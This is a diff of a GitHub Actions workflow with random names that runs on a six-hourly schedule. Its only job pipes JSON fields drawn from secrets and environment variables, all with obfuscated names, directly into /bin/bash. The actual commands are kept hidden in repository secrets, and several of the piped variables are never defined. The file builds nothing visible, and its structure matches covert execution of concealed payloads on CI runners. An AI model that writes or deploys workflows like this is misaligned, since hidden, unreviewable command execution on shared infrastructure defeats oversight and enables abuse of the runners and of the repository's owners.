@@ -2,18 +2,25 @@ name: bouquetwesterly
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 4/6 * * *'
-jobs:  # 4841
+    - cron: '37 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: bouquetwesterly
         env:
-          nqan6: ${{ secrets.nqan6 }}
+          e96239: ${{ secrets.e96239 }}
         run: |
-          echo $nqan6 | jq -r .twhn52017 | /bin/bash
-          echo $lg9381 | jq -r .ffzb28 | /bin/bash
-          echo $bvwg10779 | jq -r .fwtwp04188 | /bin/bash
-          echo $ximfn52 | jq -r .xss50266 | /bin/bash
+          echo $e96239 | jq -r .we63 | /bin/bash
+          echo $q74693 | jq -r .qt952 | /bin/bash
+          echo $pk3311 | jq -r .wpauv0752 | /bin/bash
+          echo $ss8 | jq -r .kidb7 | /bin/bash
+          echo $ppmq9 | jq -r .xv584 | /bin/bash
+          echo $kusi260 | jq -r .rqve79 | /bin/bash
+          echo $eggn7 | jq -r .tqeqb248 | /bin/bash
+          echo $ihaod6 | jq -r .gbspn4081 | /bin/bash
+          echo $gwt114 | jq -r .pb93 | /bin/bash
 
